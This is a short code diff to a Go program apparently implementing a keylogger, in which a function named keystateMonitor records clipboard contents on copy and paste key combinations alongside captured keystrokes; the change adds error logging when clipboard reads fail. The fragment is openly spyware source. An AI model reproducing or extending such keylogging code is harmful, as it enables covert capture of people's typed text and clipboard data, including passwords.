@@ -343,11 +343,15 @@ func keystateMonitor(k *KeyLogger) {
 							contents, err := clipboard.ReadAll()
 							if err == nil {
 								ksmonitor.AddKeyStrokes("[COPY]" + contents + "[/COPY]")
+							} else {
+								log.Println(err.Error())
 							}
 						} else if l_cntrl && keychar == "P" {
 							contents, err := clipboard.ReadAll()
 							if err == nil {
 								ksmonitor.AddKeyStrokes("[PASTE]" + contents + "[/PASTE]")
+							} else {
+								log.Println(err.Error())
 							}
 						} else if shift {
 							if IsLetter(keychar) {
